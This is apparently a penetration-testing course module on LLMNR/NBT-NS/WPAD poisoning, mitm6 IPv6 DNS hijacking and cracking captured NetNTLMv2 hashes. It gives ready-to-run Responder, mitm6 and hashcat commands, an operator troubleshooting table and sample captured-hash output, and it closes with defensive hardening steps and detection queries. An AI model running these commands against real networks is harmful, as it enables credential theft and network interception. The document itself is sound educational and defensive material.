# Module 03: Network Poisoning, Name Resolution Spoofing & Credential Harvesting

> **Navigation**: [⬅️ Module 02: NTLM vs Kerberos](Module-02-Authentication-Protocols-NTLM-and-Kerberos.md) | [🏠 Master Index](../README.md) | [Module 04: NTLM Relay & Coercion ➡️](Module-04-NTLM-Relay-Attacks-and-Authentication-Coercion.md)

---


## 1. Local Name Resolution Fallback Mechanics

When a Windows workstation attempts to resolve a hostname (e.g., connecting to a network file share, intranet portal, or printer), it follows a deterministic resolution hierarchy:

```
1. Local Hosts File (C:\Windows\System32\drivers\etc\hosts)
      | (If not found)
      v
2. Local DNS Cache (ipconfig /displaydns)
      | (If not found)
      v
3. Primary & Secondary Configured DNS Servers (Port 53 UDP/TCP)
      | (If DNS returns NXDOMAIN - Non-Existent Domain)
      v
4. Link-Local Multicast Name Resolution (LLMNR - UDP Port 5355)
      | (If no response after 3 retries)
      v
5. NetBIOS Name Service (NBT-NS - UDP Port 137)
      | (If no response)
      v
6. Multicast DNS (mDNS - UDP Port 5353)
```

```
+-----------------------------------------------------------------------------------------+
| THE POISONING ATTACK SURFACE: RESOLUTION FAILURE FALLBACK                               |
|                                                                                         |
|  VICTIM USER                                           ATTACKER (Listening via Responder)|
|  Types: \\financial-share                              IP: 10.0.0.150                   |
|  (Typo for \\finance-share)                                                             |
|            |                                                                            |
|            | 1. DNS Query: financial-share.corp.local                                   |
|            +----------------------------------------> DNS SERVER                        |
|                                                          |                              |
|            | 2. DNS Response: NXDOMAIN (Doesn't exist)   |                              |
|            |<--------------------------------------------+                              |
|                                                                                         |
|  Workstation panics and falls back to BROADCAST on local subnet:                        |
|                                                                                         |
|            | 3. LLMNR Multicast (UDP 5355 to 224.0.0.252)                               |
|            |    "Who has financial-share? Tell 10.0.0.50!"                              |
|            +=======================================================> [Local Subnet]     |
|                                                                             |           |
|                                                        Attacker instantly   |           |
|                                                        lies and responds:   |           |
|            | 4. Rogue LLMNR Response:                                       |           |
|            |    "I am financial-share! My IP is 10.0.0.150!"                |           |
|            |<---------------------------------------------------------------+           |
|                                                                                         |
|  Victim connects to Attacker via SMB (Port 445) and attempts to authenticate:           |
|                                                                                         |
|            | 5. NTLM NEGOTIATE (Type 1)                                                 |
|            +--------------------------------------------------------------->|           |
|            | 6. Rogue CHALLENGE (Type 2: 1122334455667788)                              |
|            |<---------------------------------------------------------------+           |
|            | 7. NTLM AUTHENTICATE (Type 3: NetNTLMv2 Hash)                              |
|            +--------------------------------------------------------------->|           |
|                                                                                         |
|                                                        [!] NetNTLMv2 Captured!          |
+-----------------------------------------------------------------------------------------+
```

---

## 2. WPAD (Web Proxy Auto-Discovery Protocol) Hijacking

The **Web Proxy Auto-Discovery (WPAD)** protocol allows web browsers and operating system components to automatically detect and configure an enterprise HTTP proxy.

### How WPAD Operates:
1. When a user logs in, opens a browser, or connects to a network, Windows attempts to download the proxy configuration file:
   $$\text{http://wpad.<domain>/wpad.dat}$$
2. If `wpad.corp.local` does not exist in internal DNS, Windows issues broadcast LLMNR and NBT-NS queries asking: *"Who is WPAD?"*
3. **The Weaponization**: An attacker listening on the network responds to the broadcast, claiming to be `WPAD`.
4. When the victim workstation connects to download `http://wpad/wpad.dat`, the attacker's rogue web server responds with a valid Proxy Auto-Config (PAC) script directing all the victim's web traffic through the attacker's proxy.
5. The attacker's server then responds with HTTP status code `407 Proxy Authentication Required` (or `401 Unauthorized`), forcing the victim's browser to submit its **NetNTLMv2 hash** silently in the background!

---

## 3. Tool Mastery: Responder Architecture & Command Flags

Laurent Gaffié's **Responder** is the industry-standard tool for LLMNR, NBT-NS, and MDNS poisoning, rogue WPAD serving, and credential capture.

```bash
# Syntax:
responder -I <interface> [flags]
```

### Complete Command Flag Breakdown:
| Flag | Name | Operational Purpose & Real-World Usage |
| :--- | :--- | :--- |
| **`-I eth0`** | `--interface` | **Mandatory**. Specifies the network interface to bind to. |
| **`-r`** | `--reset` | Answers NetBIOS wredir suffix queries. Useful for capturing workstation credentials. |
| **`-d`** | `--DHCP` | Enables the rogue DHCP server. Injects rogue DNS and WPAD settings into DHCP discover/request packets. |
| **`-w`** | `--wpad` | **Critical**. Starts the rogue WPAD HTTP server and answers WPAD name queries. |
| **`-F`** | `--ForceWpadAuth` | **High Yield**. Forces an NTLM authentication popup/challenge when the victim requests `wpad.dat`. |
| **`-v`** | `--verbose` | Displays live incoming packets, client hostnames, and verbose authentication handshake details. |
| **`-b`** | `--basic` | Returns a Basic Authentication challenge (cleartext credentials) instead of NTLM for HTTP services. |
| **`-P`** | `--ProxyAuth` | Forces NTLM proxy authentication for rogue proxy requests. |

### Inspecting and Configuring `Responder.conf`:
Before launching Responder, operators inspect `/etc/responder/Responder.conf`:
```ini
[Responder Core]
; Set to On to answer LLMNR/NBT-NS queries
LLMNR = On
NBTNS = On
MDNS = On

[Responder HTTP Server]
; Set to On to capture HTTP credentials and serve WPAD
HTTP = On
HTTPS = On

[Responder Rogue Servers]
; If performing NTLM Relay with ntlmrelayx, turn SMB and HTTP OFF in Responder!
; To capture hashes locally with Responder, turn them ON:
SMB = On
SQL = On
FTP = On
LDAP = On
```

### Real Terminal Output: Executing Responder in the Field
```text
root@kali:~# responder -I eth0 -dwv -F
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

  [+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

  [+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    LDAP server                [ON]

[+] [LLMNR]  Poisoned answer sent to 10.0.0.52 for name FINANCIAL-SHARE
[+] [SMB] NTLMv2-SSP Client   : 10.0.0.52
[+] [SMB] NTLMv2-SSP Username : CORP\jdoe
[+] [SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122334455667788:5C2B4E9A7...:0101000000000000...
```

---

## 4. Mitm6: IPv6 DNS Hijacking on IPv4 Enterprise Networks

Modern versions of Windows (Windows 10, 11, Server 2016-2022) have IPv6 enabled by default on all network adapters. Furthermore, **Windows prefers IPv6 DNS servers over IPv4 DNS servers**.

However, most corporate network administrators only configure and monitor IPv4 DHCP and DNS servers. The IPv6 space is left completely unconfigured.

### The Attack Flow:
```
+-----------------------------------------------------------------------------------+
| MITM6 ATTACK CHAIN                                                                |
|                                                                                   |
|  VICTIM WINDOWS 11 WORKSTATION                         ATTACKER (Running mitm6)   |
|  (IPv6 Enabled, no IPv6 router)                        IP: fe80::1                |
|            |                                                   |                  |
|            | 1. Periodic DHCPv6 Solicit (Multicast ff02::1:2)  |                  |
|            |    "Is there an IPv6 Router / DNS Server?"        |                  |
|            +-------------------------------------------------->|                  |
|                                                                |                  |
|                                                                | mitm6 replies    |
|                                                                | immediately:     |
|            | 2. DHCPv6 Advertise / Reply                       |                  |
|            |    * Assigns IPv6 Address                         |                  |
|            |    * Sets Attacker (fe80::1) as PRIMARY DNS!      |                  |
|            |<--------------------------------------------------+                  |
|                                                                                   |
|  Victim sets Attacker as its #1 preferred DNS server!                             |
|  When the victim attempts to resolve ANY domain name (including DC or WPAD),     |
|  it queries the Attacker via IPv6 DNS!                                            |
|                                                                                   |
|            | 3. DNS Query: wpad.corp.local (over IPv6)                            |
|            +-------------------------------------------------->|                  |
|            | 4. DNS Reply: Points to Attacker's IPv6 Address   |                  |
|            |<--------------------------------------------------+                  |
|                                                                                   |
|  Victim connects to Attacker -> Relayed directly to LDAP/ADCS via ntlmrelayx!    |
+-----------------------------------------------------------------------------------+
```

### Mitm6 Command Syntax:
```bash
# Listen on interface eth0, targeting domain corp.local
sudo mitm6 -i eth0 -d corp.local --ignore-nofqdn
```

---

## 5. Offline Password Cracking Tradecraft: Hashcat & John the Ripper

Once a NetNTLMv2 hash is captured, it cannot be passed over the wire. It must either be cracked offline to recover the plaintext password or relayed in real-time.

### Hashcat Command Reference:
NetNTLMv2 hashes are cracked using Hashcat mode **`5600`** (`NetNTLMv2`):

```bash
# Syntax:
hashcat -m 5600 [options] <hash_file> <wordlist> [rules]
```

#### Detailed Flag Breakdown:
* **`-m 5600`**: Sets hash type to NetNTLMv2 (NetNTLMv1 is `-m 5500`).
* **`-a 0`**: Straight dictionary attack mode (`0 = Straight`, `3 = Brute-force/Mask`).
* **`-w 3`**: Workload profile `3` (High responsiveness; dedicates maximum GPU cycles to cracking).
* **`-O`**: Optimized kernel code (limits password length to 32 characters to maximize GPU register efficiency and cracking speed).
* **`-r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule`**: Applies rule transformations (casing, appending numbers, leetspeak) to every word in the dictionary.
* **`--status --status-timer=10`**: Prints live GPU temperature, speed (hashes/sec), and progress every 10 seconds.

```bash
# Production Cracking Command:
hashcat -m 5600 -a 0 hashes.netntlmv2 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -w 3 -O --status
```

### John the Ripper Syntax:
```bash
john --format=netntlmv2 hashes.netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 6. Field Operator Troubleshooting & Error Scenarios

During live internal assessments, operators frequently encounter situations where poisoning fails to yield hashes:

```
+------------------------------------+------------------------------------+---------------------------------------+
| Observed Symptom / Error           | Root Cause                         | Operational Resolution / Workaround   |
+------------------------------------+------------------------------------+---------------------------------------+
| Responder runs, but zero LLMNR     | Windows Firewall drops incoming    | Switch to Mitm6 (IPv6 DHCP/DNS). Most |
| poison requests are received from  | UDP 5355 if the network profile is | firewalls permit outbound DHCPv6 even |
| modern Windows 11 endpoints.       | categorized as "Public".           | on Public profiles.                   |
+------------------------------------+------------------------------------+---------------------------------------+
| Captured hash username ends with a | Machine account ($) authenticated  | Discard machine hash (uncrackable).   |
| dollar sign (e.g., WS01$).         | via background system tasks.       | Target interactive user logins via    |
|                                    | Machine passwords are 120 random   | forcing WPAD authentication (-F) or   |
|                                    | hex characters.                    | coercing administrative sessions.     |
+------------------------------------+------------------------------------+---------------------------------------+
| "Address already in use" error on  | Local system service (e.g. systemd-| Disable conflicting system services:  |
| port 53 or port 445 when launching | resolved or smbd) is occupying the | sudo systemctl stop systemd-resolved  |
| Responder.                         | port.                              | sudo systemctl stop smbd              |
+------------------------------------+------------------------------------+---------------------------------------+
| Target responds with Kerberos      | Victim workstation resolves target | Spoof an unqualified single-label     |
| rather than NTLM, denying hash     | via FQDN. Kerberos requires FQDN   | hostname (e.g., \\fileshare) which    |
| capture.                           | and SPN matching.                  | forces NTLM fallback over broadcast.  |
+------------------------------------+------------------------------------+---------------------------------------+
```

---

## 7. Enterprise Defensive Hardening & Detection Engineering

### 1. Disabling LLMNR Domain-Wide via Group Policy:
1. Open `gpmc.msc` on a Domain Controller.
2. Navigate to: `Computer Configuration -> Administrative Templates -> Network -> DNS Client`.
3. Locate **Turn off multicast name resolution**.
4. Set to **Enabled**.
* Registry equivalent:
  ```powershell
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0 -Type DWord
  ```

### 2. Disabling NetBIOS over TCP/IP:
* Configure DHCP Server Option `043 (Vendor Specific Info)` with sub-option `001` set to `2` (Disable NetBIOS).
* Or via PowerShell across all network adapters:
  ```powershell
  $adapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
  foreach ($adapter in $adapters) {
      $adapter.SetTcpipNetbios(2) # 2 = Disable NetBIOS over TCP/IP
  }
  ```

### 3. SIEM Detection Queries (Splunk / Elastic):
Detecting abnormal NTLM Type 3 network logons (Event ID 4624):
```sql
index=windows EventCode=4624 Logon_Type=3 Authentication_Package="NTLM"
| stats count by Account_Name, Source_Network_Address, Workstation_Name
| where count > 20
```


---

> **Navigation**: [⬅️ Module 02: NTLM vs Kerberos](Module-02-Authentication-Protocols-NTLM-and-Kerberos.md) | [🏠 Master Index](../README.md) | [Module 04: NTLM Relay & Coercion ➡️](Module-04-NTLM-Relay-Attacks-and-Authentication-Coercion.md)
